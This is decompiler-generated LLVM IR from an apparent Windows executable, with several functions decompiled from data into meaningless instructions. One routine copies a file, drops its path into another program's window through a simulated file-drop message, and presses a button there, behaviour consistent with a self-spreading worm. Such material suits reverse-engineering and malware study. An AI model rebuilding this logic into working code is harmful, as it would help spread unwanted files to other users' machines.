  %88 = add i32 %esp.0.reload, -116, !insn.addr !977
  %89 = inttoptr i32 %88 to i32*, !insn.addr !977
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %89, align 4, !insn.addr !977
  %90 = add i32 %esp.0.reload, -120, !insn.addr !978
  %91 = inttoptr i32 %90 to i32*, !insn.addr !978
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %91, align 4, !insn.addr !978
  %92 = add i32 %esp.0.reload, -124, !insn.addr !979
  %93 = inttoptr i32 %92 to i32*, !insn.addr !979
  store i32 %arg4, i32* %93, align 4, !insn.addr !979
  %94 = add i32 %esp.0.reload, -128, !insn.addr !980
  %95 = inttoptr i32 %94 to i32*, !insn.addr !980
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %95, align 4, !insn.addr !980
  %96 = add i32 %esp.0.reload, -132, !insn.addr !981
  %97 = inttoptr i32 %96 to i32*, !insn.addr !981
  store i32 ptrtoint (i32* @global_var_405b10 to i32), i32* %97, align 4, !insn.addr !981
  %98 = add i32 %esp.0.reload, -136, !insn.addr !982
  %99 = inttoptr i32 %98 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %99, align 4, !insn.addr !982
  %100 = call i32 @"@LStrCatN"(), !insn.addr !983
  %101 = call i32 @function_405724(), !insn.addr !984
  %102 = call i32 @function_4057a4(), !insn.addr !985
  %103 = call i32 @function_405724(), !insn.addr !986
  %104 = call i32 @function_4057a4(), !insn.addr !987
  %105 = call i32 @function_405718(), !insn.addr !988
  store i32* %99, i32** %.pre-phi.reg2mem, !insn.addr !989
  store i32 %98, i32* %esp.1.reg2mem, !insn.addr !989
  br label %dec_label_pc_405a10, !insn.addr !989

dec_label_pc_405a10:                              ; preds = %dec_label_pc_40584e, %dec_label_pc_4057e0
  %106 = add i32 %esp.0.reload, -16, !insn.addr !990
  %107 = inttoptr i32 %106 to i32*, !insn.addr !990
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %108 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !991
  call void @__writefsdword(i32 0, i32 %108), !insn.addr !992
  %109 = add i32 %esp.1.reload, 8, !insn.addr !993
  %110 = inttoptr i32 %109 to i32*, !insn.addr !993
  store i32 4217420, i32* %110, align 4, !insn.addr !993
  %111 = call i32 @"@LStrArrayClr"(), !insn.addr !994
  %112 = call i32 @"@LStrArrayClr"(), !insn.addr !995
  %113 = call i32 @"@LStrArrayClr"(), !insn.addr !996
  ret i32 %113, !insn.addr !997
}

define i32 @function_405a45() local_unnamed_addr {
dec_label_pc_405a45:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !998
  ret i32 %0, !insn.addr !998
}

define i32 @function_405a4a() local_unnamed_addr {
dec_label_pc_405a4a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !999
}

define i32 @function_405a4c(i32 %arg1) local_unnamed_addr {
dec_label_pc_405a4c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1000
}

define i32 @function_405b17() local_unnamed_addr {
dec_label_pc_405b17:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !1001
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1001
  store i32 %3, i32* %4, align 4, !insn.addr !1001
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1002
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1002
  %9 = add i8 %6, %8, !insn.addr !1002
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1002
  store i8 %9, i8* %10, align 1, !insn.addr !1002
  %11 = add i32 %2, 85, !insn.addr !1003
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1003
  %13 = load i8, i8* %12, align 1, !insn.addr !1003
  %14 = trunc i32 %1 to i8, !insn.addr !1003
  %15 = add i8 %13, %14, !insn.addr !1003
  store i8 %15, i8* %12, align 1, !insn.addr !1003
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !1004
  store i32 %16, i32* %stack_var_-16, align 4, !insn.addr !1004
  %17 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1004
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !1005
  %18 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !1006
  %19 = add i32 %18, 1, !insn.addr !1006
  %20 = icmp eq i32 %19, 0, !insn.addr !1006
  store i32 %19, i32* @global_var_4096b4, align 4, !insn.addr !1006
  %21 = icmp eq i1 %20, false, !insn.addr !1007
  br i1 %21, label %dec_label_pc_405b51, label %dec_label_pc_405b3d, !insn.addr !1007

dec_label_pc_405b3d:                              ; preds = %dec_label_pc_405b17
  %22 = call i32 @"@LStrClr"(), !insn.addr !1008
  %23 = call i32 @"@LStrClr"(), !insn.addr !1009
  br label %dec_label_pc_405b51, !insn.addr !1009

dec_label_pc_405b51:                              ; preds = %dec_label_pc_405b3d, %dec_label_pc_405b17
  %24 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1010
  call void @__writefsdword(i32 0, i32 %24), !insn.addr !1011
  ret i32 0, !insn.addr !1012
}

define i32 @function_405b5f() local_unnamed_addr {
dec_label_pc_405b5f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1013
  ret i32 %0, !insn.addr !1013
}

define i32 @function_405b64() local_unnamed_addr {
dec_label_pc_405b64:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1014
}

define i32 @function_405b66(i32 %arg1) local_unnamed_addr {
dec_label_pc_405b66:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1015
}

define i32 @function_405b68() local_unnamed_addr {
dec_label_pc_405b68:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !1016
  %2 = add i32 %1, -1, !insn.addr !1016
  store i32 %2, i32* @global_var_4096b4, align 4, !insn.addr !1016
  ret i32 %0, !insn.addr !1017
}

define i32 @function_405b70() local_unnamed_addr {
dec_label_pc_405b70:
  %esp.0.reg2mem = alloca i32, !insn.addr !1018
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-64 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-28 = alloca i8*, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1019
  %2 = icmp eq i32 %0, 0, !insn.addr !1020
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1021
  br i1 %2, label %dec_label_pc_405c7a, label %dec_label_pc_405b8a, !insn.addr !1021

dec_label_pc_405b8a:                              ; preds = %dec_label_pc_405b70
  %3 = call i32 @function_4036c8(), !insn.addr !1022
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1023
  store i8* %4, i8** %stack_var_-28, align 4, !insn.addr !1023
  %5 = ptrtoint i8** %stack_var_-28 to i32, !insn.addr !1023
  %6 = call i1 @PathFileExistsA(i8* %4), !insn.addr !1024
  %7 = icmp eq i1 %6, false, !insn.addr !1025
  store i32 %5, i32* %esp.0.reg2mem, !insn.addr !1026
  br i1 %7, label %dec_label_pc_405c7a, label %dec_label_pc_405ba5, !insn.addr !1026

dec_label_pc_405ba5:                              ; preds = %dec_label_pc_405b8a
  %8 = load i8*, i8** %stack_var_-28, align 4
  %9 = call i32* @FindWindowExA(i32* null, i32* bitcast ([7 x i8]* @global_var_405c88 to i32*), i8* null, i8* %8), !insn.addr !1027
  %10 = ptrtoint i32* %9 to i32, !insn.addr !1027
  store i32 %10, i32* %stack_var_-48, align 4, !insn.addr !1028
  %11 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1028
  %12 = call i1 @IsWindow(i32* %9), !insn.addr !1029
  %13 = icmp eq i1 %12, false, !insn.addr !1030
  store i32 %11, i32* %esp.0.reg2mem, !insn.addr !1031
  br i1 %13, label %dec_label_pc_405c7a, label %dec_label_pc_405bce, !insn.addr !1031

dec_label_pc_405bce:                              ; preds = %dec_label_pc_405ba5
  %14 = call i32 @function_4034c8(), !insn.addr !1032
  %15 = add i32 %14, 22, !insn.addr !1033
  store i32 66, i32* %stack_var_-56, align 4, !insn.addr !1034
  %16 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1034
  %17 = call i32* @GlobalAlloc(i32 %15, i32 66), !insn.addr !1035
  %18 = icmp eq i32* %17, null, !insn.addr !1036
  store i32 %16, i32* %esp.0.reg2mem, !insn.addr !1037
  br i1 %18, label %dec_label_pc_405c7a, label %dec_label_pc_405bed, !insn.addr !1037

dec_label_pc_405bed:                              ; preds = %dec_label_pc_405bce
  %19 = call i32* @GlobalLock(i32* nonnull %17), !insn.addr !1038
  %20 = icmp eq i32* %19, null, !insn.addr !1039
  %21 = icmp eq i1 %20, false, !insn.addr !1040
  br i1 %21, label %dec_label_pc_405c01, label %dec_label_pc_405bf9, !insn.addr !1040

dec_label_pc_405bf9:                              ; preds = %dec_label_pc_405bed
  %22 = bitcast i32* %17 to i8*, !insn.addr !1041
  store i8* %22, i8** %stack_var_-64, align 4, !insn.addr !1041
  %23 = ptrtoint i8** %stack_var_-64 to i32, !insn.addr !1041
  %24 = call i32* @GlobalFree(i32* nonnull %17), !insn.addr !1042
  store i32 %23, i32* %esp.0.reg2mem, !insn.addr !1043
  br label %dec_label_pc_405c7a, !insn.addr !1043

dec_label_pc_405c01:                              ; preds = %dec_label_pc_405bed
  %25 = ptrtoint i32* %17 to i32, !insn.addr !1035
  %26 = ptrtoint i32* %19 to i32, !insn.addr !1038
  store i32 20, i32* %19, align 4, !insn.addr !1044
  %27 = add i32 %26, 4, !insn.addr !1045
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1045
  store i32 0, i32* %28, align 4, !insn.addr !1045
  %29 = add i32 %26, 8, !insn.addr !1046
  %30 = inttoptr i32 %29 to i32*, !insn.addr !1046
  store i32 0, i32* %30, align 4, !insn.addr !1046
  %31 = add i32 %26, 12, !insn.addr !1047
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1047
  store i32 0, i32* %32, align 4, !insn.addr !1047
  %33 = add i32 %26, 16, !insn.addr !1048
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1048
  store i32 0, i32* %34, align 4, !insn.addr !1048
  %35 = call i32 @function_4036c8(), !insn.addr !1049
  %36 = inttoptr i32 %35 to i8*, !insn.addr !1050
  store i8* %36, i8** %stack_var_-64, align 4, !insn.addr !1050
  %37 = add i32 %26, 20, !insn.addr !1051
  %38 = inttoptr i32 %37 to i8*, !insn.addr !1052
  %39 = call i8* @lstrcpyA(i8* %36, i8* %38), !insn.addr !1053
  %40 = call i1 @GlobalUnlock(i32* nonnull %17), !insn.addr !1054
  %41 = call i1 @PostMessageA(i32* null, i32 %25, i32 563, i32 %10), !insn.addr !1055
  %42 = call i32 @function_406f2c(i32 4218000, i32 2000, i32 -1), !insn.addr !1056
  store i32 %42, i32* %stack_var_-104, align 4, !insn.addr !1057
  %43 = ptrtoint i32* %stack_var_-104 to i32, !insn.addr !1057
  %44 = inttoptr i32 %42 to i32*, !insn.addr !1058
  %45 = call i1 @IsWindow(i32* %44), !insn.addr !1058
  %46 = icmp eq i1 %45, false, !insn.addr !1059
  store i32 %43, i32* %esp.0.reg2mem, !insn.addr !1060
  br i1 %46, label %dec_label_pc_405c7a, label %dec_label_pc_405c6b, !insn.addr !1060

dec_label_pc_405c6b:                              ; preds = %dec_label_pc_405c01
  store i32 %42, i32* %stack_var_-120, align 4, !insn.addr !1061
  %47 = ptrtoint i32* %stack_var_-120 to i32, !insn.addr !1061
  %48 = call i32 @SendMessageA(i32* null, i32 0, i32 245, i32 %42), !insn.addr !1062
  store i32 %47, i32* %esp.0.reg2mem, !insn.addr !1062
  br label %dec_label_pc_405c7a, !insn.addr !1062

dec_label_pc_405c7a:                              ; preds = %dec_label_pc_405c6b, %dec_label_pc_405c01, %dec_label_pc_405bf9, %dec_label_pc_405bce, %dec_label_pc_405ba5, %dec_label_pc_405b8a, %dec_label_pc_405b70
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %49 = add i32 %esp.0.reload, 4, !insn.addr !1063
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1063
  %51 = load i32, i32* %50, align 4, !insn.addr !1063
  ret i32 %51, !insn.addr !1064
}

define i32 @function_405c85(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_405c85:
  %ebp.0.reg2mem = alloca i32, !insn.addr !1065
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %ebx = alloca i32, align 4
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %5 = trunc i32 %4 to i8
  %6 = mul i8 %5, 2, !insn.addr !1065
  %7 = inttoptr i32 %4 to i8*, !insn.addr !1065
  store i8 %6, i8* %7, align 1, !insn.addr !1065
  %8 = bitcast i32* %ebx to i8*
  %9 = load i8, i8* %8, align 4, !insn.addr !1066
  %10 = udiv i32 %4, 256, !insn.addr !1066
  %11 = trunc i32 %10 to i8, !insn.addr !1066
  %12 = add i8 %9, %11, !insn.addr !1066
  %13 = load i32, i32* %ebx, align 4, !insn.addr !1066
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1066
  store i8 %12, i8* %14, align 1, !insn.addr !1066
  %15 = and i32 %4, 14
  %16 = icmp ugt i32 %15, 9, !insn.addr !1067
  %17 = add i32 %4, 6, !insn.addr !1067
  %18 = select i1 %16, i32 %17, i32 %4, !insn.addr !1067
  %19 = zext i1 %16 to i32, !insn.addr !1067
  %20 = and i32 %4, -65536, !insn.addr !1067
  %21 = and i32 %18, 14
  %22 = icmp ugt i32 %21, 9, !insn.addr !1068
  %23 = or i1 %16, %22, !insn.addr !1068
  %24 = add i32 %18, 6, !insn.addr !1068
  %25 = select i1 %23, i32 %24, i32 %18, !insn.addr !1068
  %26 = zext i1 %23 to i32, !insn.addr !1068
  %27 = and i32 %25, 15, !insn.addr !1068
  %28 = or i32 %27, %20, !insn.addr !1068
  %reass.add = add nuw nsw i32 %26, %19
  %reass.mul = mul i32 %reass.add, 256
  %29 = add i32 %reass.mul, %4
  %30 = and i32 %29, 65280, !insn.addr !1068
  %31 = or i32 %28, %30, !insn.addr !1068
  %32 = inttoptr i32 %31 to i8*, !insn.addr !1069
  %33 = load i8, i8* %32, align 1, !insn.addr !1069
  %34 = trunc i32 %27 to i8, !insn.addr !1069
  %35 = xor i8 %33, %34, !insn.addr !1069
  store i8 %35, i8* %32, align 1, !insn.addr !1069
  %36 = add i32 %0, 1311123697, !insn.addr !1070
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1070
  %38 = load i8, i8* %37, align 1, !insn.addr !1070
  %39 = udiv i32 %3, 256, !insn.addr !1070
  %40 = trunc i32 %39 to i8, !insn.addr !1070
  %41 = add i8 %38, %40, !insn.addr !1070
  store i8 %41, i8* %37, align 1, !insn.addr !1070
  %42 = inttoptr i32 %31 to i32*, !insn.addr !1071
  %43 = load i32, i32* %42, align 4, !insn.addr !1071
  %44 = sub i32 %43, %31, !insn.addr !1071
  store i32 %44, i32* %42, align 4, !insn.addr !1071
  %45 = add i32 %3, 117, !insn.addr !1072
  %46 = inttoptr i32 %45 to i8*, !insn.addr !1072
  %47 = load i8, i8* %46, align 1, !insn.addr !1072
  %48 = add i8 %47, %34, !insn.addr !1072
  %49 = icmp eq i8 %48, 0, !insn.addr !1072
  store i8 %48, i8* %46, align 1, !insn.addr !1072
  br i1 %49, label %dec_label_pc_405d10, label %dec_label_pc_405c9c, !insn.addr !1073

dec_label_pc_405c9c:                              ; preds = %dec_label_pc_405c85
  %50 = xor i32 %3, %1, !insn.addr !1074
  %51 = trunc i32 %3 to i16, !insn.addr !1075
  %52 = inttoptr i32 %50 to i32*, !insn.addr !1075
  %53 = load i32, i32* %52, align 4, !insn.addr !1075
  call void @__asm_outsd(i16 %51, i32 %53), !insn.addr !1075
  %54 = inttoptr i32 %50 to i8*, !insn.addr !1076
  %55 = load i8, i8* %54, align 1, !insn.addr !1076
  call void @__asm_outsb(i16 %51, i8 %55), !insn.addr !1076
  %56 = load i8, i8* %32, align 1, !insn.addr !1077
  %57 = add i8 %56, %34, !insn.addr !1077
  store i8 %57, i8* %32, align 1, !insn.addr !1077
  %58 = call i32 @__asm_iretd(), !insn.addr !1078
  %59 = add i32 %2, -117, !insn.addr !1079
  %60 = inttoptr i32 %59 to i8*, !insn.addr !1079
  %61 = load i8, i8* %60, align 1, !insn.addr !1079
  %62 = add i8 %61, -69, !insn.addr !1079
  store i8 %62, i8* %60, align 1, !insn.addr !1079
  %63 = call i8 @__asm_in(i16 -11077), !insn.addr !1080
  %64 = call i32 @__readfsdword(i32 0), !insn.addr !1081
  store i32 %64, i32* %stack_var_-12, align 4, !insn.addr !1081
  %65 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1081
  call void @__writefsdword(i32 0, i32 %65), !insn.addr !1082
  %66 = load i32, i32* @global_var_4096bc, align 4, !insn.addr !1083
  %67 = add i32 %66, 1, !insn.addr !1083
  store i32 %67, i32* @global_var_4096bc, align 4, !insn.addr !1083
  %68 = load i32, i32* %stack_var_-12, align 4, !insn.addr !1084
  call void @__writefsdword(i32 0, i32 %68), !insn.addr !1085
  ret i32 0, !insn.addr !1086

dec_label_pc_405d10:                              ; preds = %dec_label_pc_405c85
  %69 = call i32 @function_403c90(), !insn.addr !1087
  store i32 %69, i32* %ebx, align 4, !insn.addr !1088
  %70 = icmp slt i32 %69, 0, !insn.addr !1089
  br i1 %70, label %dec_label_pc_405d38, label %dec_label_pc_405d20, !insn.addr !1090

dec_label_pc_405d20:                              ; preds = %dec_label_pc_405d10
  %71 = add i32 %69, 1, !insn.addr !1091
  store i32 %71, i32* %ebx, align 4, !insn.addr !1091
  %72 = call i32 @"@LStrCmp"(), !insn.addr !1092
  br label %dec_label_pc_405d79

dec_label_pc_405d38:                              ; preds = %dec_label_pc_405d10
  %73 = call i32 @function_403c88(), !insn.addr !1093
  %74 = call i32 @"@DynArraySetLength"(), !insn.addr !1094
  %75 = call i32 @function_403c90(), !insn.addr !1095
  %76 = call i32 @"@LStrAsg"(), !insn.addr !1096
  store i32 -1, i32* %ebp.0.reg2mem, !insn.addr !1097
  br label %dec_label_pc_405d79, !insn.addr !1097

dec_label_pc_405d79:                              ; preds = %dec_label_pc_405d20, %dec_label_pc_405d38
  %ebp.0.reload = load i32, i32* %ebp.0.reg2mem
  ret i32 %ebp.0.reload, !insn.addr !1098
}

define i32 @function_405d80() local_unnamed_addr {
dec_label_pc_405d80:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1099
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1099
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1099
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1100
  %2 = load i32, i32* @global_var_4096c0, align 4, !insn.addr !1101
  %3 = add i32 %2, 1, !insn.addr !1101
  %4 = icmp eq i32 %3, 0, !insn.addr !1101
  store i32 %3, i32* @global_var_4096c0, align 4, !insn.addr !1101
  %5 = icmp eq i1 %4, false, !insn.addr !1102
  br i1 %5, label %dec_label_pc_405da9, label %dec_label_pc_405d99, !insn.addr !1102

dec_label_pc_405d99:                              ; preds = %dec_label_pc_405d80
  %6 = call i32 @"@DynArrayClear"(), !insn.addr !1103
  br label %dec_label_pc_405da9, !insn.addr !1103

dec_label_pc_405da9:                              ; preds = %dec_label_pc_405d99, %dec_label_pc_405d80
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1104
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1105
  ret i32 0, !insn.addr !1106
}

define i32 @function_405db7() local_unnamed_addr {
dec_label_pc_405db7:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1107
  ret i32 %0, !insn.addr !1107
}

define i32 @function_405dbc() local_unnamed_addr {
dec_label_pc_405dbc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1108
}

define i32 @function_405dbe(i32 %arg1) local_unnamed_addr {
dec_label_pc_405dbe:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1109
}

define i32 @function_405dc0() local_unnamed_addr {
dec_label_pc_405dc0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1110
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1110
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1110
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1111
  %2 = load i32, i32* @global_var_4096c0, align 4, !insn.addr !1112
  %3 = add i32 %2, -1, !insn.addr !1112
  %4 = icmp eq i32 %2, 0, !insn.addr !1112
  store i32 %3, i32* @global_var_4096c0, align 4, !insn.addr !1112
  %5 = icmp eq i1 %4, false, !insn.addr !1113
  br i1 %5, label %dec_label_pc_405df4, label %dec_label_pc_405dda, !insn.addr !1113

dec_label_pc_405dda:                              ; preds = %dec_label_pc_405dc0
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1114
  br label %dec_label_pc_405df4, !insn.addr !1115

dec_label_pc_405df4:                              ; preds = %dec_label_pc_405dda, %dec_label_pc_405dc0
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1116
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1117
  ret i32 0, !insn.addr !1118
}

define i32 @function_405e02() local_unnamed_addr {
dec_label_pc_405e02:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1119
  ret i32 %0, !insn.addr !1119
}

define i32 @function_405e07() local_unnamed_addr {
dec_label_pc_405e07:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1120
}

define i32 @function_405e09(i32 %arg1) local_unnamed_addr {
dec_label_pc_405e09:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1121
}

define i32 @function_405e0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_405e0c:
  %esp.0.reg2mem = alloca i32, !insn.addr !1122
  %.reg2mem = alloca i8, !insn.addr !1122
  %esi = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-76 = alloca i8*, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  call void @__asm_into(i32 %4), !insn.addr !1122
  %5 = trunc i32 %2 to i8, !insn.addr !1123
  %6 = and i8 %5, 31, !insn.addr !1123
  %7 = icmp eq i8 %6, 0, !insn.addr !1123
  br i1 %7, label %dec_label_pc_405e0c._crit_edge, label %9, !insn.addr !1123

dec_label_pc_405e0c._crit_edge:                   ; preds = %dec_label_pc_405e0c
  %8 = trunc i32 %0 to i8
  store i8 %8, i8* %.reg2mem
  br label %14

; <label>:9:                                      ; preds = %dec_label_pc_405e0c
  %10 = add i32 %1, -959064636, !insn.addr !1123
  %11 = inttoptr i32 %10 to i8*, !insn.addr !1123
  %12 = load i8, i8* %11, align 1, !insn.addr !1123
  %13 = shl i8 %12, %6, !insn.addr !1123
  store i8 %13, i8* %11, align 1, !insn.addr !1123
  %.phi.trans.insert = bitcast i32* %esi to i8*
  %.pre = load i8, i8* %.phi.trans.insert, align 4
  store i8 %.pre, i8* %.reg2mem, !insn.addr !1123
  br label %14, !insn.addr !1123

; <label>:14:                                     ; preds = %dec_label_pc_405e0c._crit_edge, %9
  %.reload = load i8, i8* %.reg2mem, !insn.addr !1124
  %15 = zext i8 %.reload to i32, !insn.addr !1124
  %16 = and i32 %3, -256, !insn.addr !1124
  %17 = or i32 %16, %15, !insn.addr !1124
  %18 = inttoptr i32 %17 to i8*, !insn.addr !1125
  %19 = load i8, i8* %18, align 1, !insn.addr !1125
  %factor = mul i8 %.reload, 30
  %20 = add i8 %factor, %19, !insn.addr !1126
  store i8 %20, i8* %18, align 1, !insn.addr !1126
  store i32 0, i32* %stack_var_-16, align 4, !insn.addr !1127
  store i32 %arg1, i32* %esi, align 4, !insn.addr !1128
  %21 = call i32 @__readfsdword(i32 0), !insn.addr !1129
  store i32 %21, i32* %stack_var_-48, align 4, !insn.addr !1129
  %22 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1129
  call void @__writefsdword(i32 0, i32 %22), !insn.addr !1130
  store i32 %arg1, i32* %stack_var_-56, align 4, !insn.addr !1131
  %23 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1131
  %24 = call i32 @GetClassLongA(i32* inttoptr (i32 -1 to i32*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1132
  %25 = icmp eq i32 %24, 32770, !insn.addr !1133
  %26 = icmp eq i1 %25, false, !insn.addr !1134
  store i32 %23, i32* %esp.0.reg2mem, !insn.addr !1134
  br i1 %26, label %dec_label_pc_405f34, label %dec_label_pc_405e88, !insn.addr !1134

dec_label_pc_405e88:                              ; preds = %14
  %27 = call i32 @function_407020(), !insn.addr !1135
  %28 = call i32 @"@LStrPos"(), !insn.addr !1136
  %29 = call i32 @"@LStrPos"(), !insn.addr !1137
  %30 = add i32 %29, -1, !insn.addr !1138
  %31 = icmp slt i32 %30, 0, !insn.addr !1139
  %32 = add i32 %28, 2, !insn.addr !1140
  %33 = icmp sgt i32 %32, %30, !insn.addr !1141
  %or.cond = or i1 %31, %33
  store i32 %23, i32* %esp.0.reg2mem, !insn.addr !1142
  br i1 %or.cond, label %dec_label_pc_405f34, label %dec_label_pc_405ebc, !insn.addr !1142

dec_label_pc_405ebc:                              ; preds = %dec_label_pc_405e88
  %34 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1143
  store i32 %34, i32* %stack_var_-60, align 4, !insn.addr !1143
  %35 = ptrtoint i32* %stack_var_-60 to i32, !insn.addr !1143
  %36 = call i32 @"@LStrCopy"(), !insn.addr !1144
  %37 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1145
  %38 = icmp eq i32 %37, 0, !insn.addr !1145
  store i32 %35, i32* %esp.0.reg2mem, !insn.addr !1146
  br i1 %38, label %dec_label_pc_405f34, label %dec_label_pc_405ee4, !insn.addr !1146

dec_label_pc_405ee4:                              ; preds = %dec_label_pc_405ebc
  %39 = call i32 @function_406e08(), !insn.addr !1147
  %40 = call i32 @"@LStrFromPChar"(), !insn.addr !1148
  %41 = call i32 @"@LStrCat"(), !insn.addr !1149
  %42 = call i32 @function_4036c8(), !insn.addr !1150
  %43 = inttoptr i32 %42 to i8*, !insn.addr !1151
  %44 = call i1 @DeleteFileA(i8* %43), !insn.addr !1152
  %45 = call i32 @function_4036c8(), !insn.addr !1153
  %46 = inttoptr i32 %45 to i8*, !insn.addr !1154
  store i8* %46, i8** %stack_var_-76, align 4, !insn.addr !1154
  %47 = ptrtoint i8** %stack_var_-76 to i32, !insn.addr !1154
  %48 = call i1 @CopyFileA(i8* %46, i8* bitcast (i32* @0 to i8*), i1 ptrtoint (i32* @0 to i1)), !insn.addr !1155
  %49 = call i32 @function_405b70(), !insn.addr !1156
  store i32 %47, i32* %esp.0.reg2mem, !insn.addr !1156
  br label %dec_label_pc_405f34, !insn.addr !1156

dec_label_pc_405f34:                              ; preds = %dec_label_pc_405ee4, %dec_label_pc_405ebc, %dec_label_pc_405e88, %14
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %50 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1157
  %51 = load i32, i32* %50, align 4, !insn.addr !1157
  call void @__writefsdword(i32 0, i32 %51), !insn.addr !1158
  %52 = add i32 %esp.0.reload, 8, !insn.addr !1159
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1159
  store i32 4218710, i32* %53, align 4, !insn.addr !1159
  %54 = call i32 @"@LStrArrayClr"(), !insn.addr !1160
  ret i32 %54, !insn.addr !1161
}

define i32 @function_405f4f() local_unnamed_addr {
dec_label_pc_405f4f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1162
  ret i32 %0, !insn.addr !1162
}

define i32 @function_405f54() local_unnamed_addr {
dec_label_pc_405f54:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1163
}

define i32 @function_405f56(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405f56:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1164
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1164
  %3 = load i32, i32* %2, align 4, !insn.addr !1164
  ret i32 %3, !insn.addr !1165
}

define i32 @function_405f67() local_unnamed_addr {
dec_label_pc_405f67:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1166
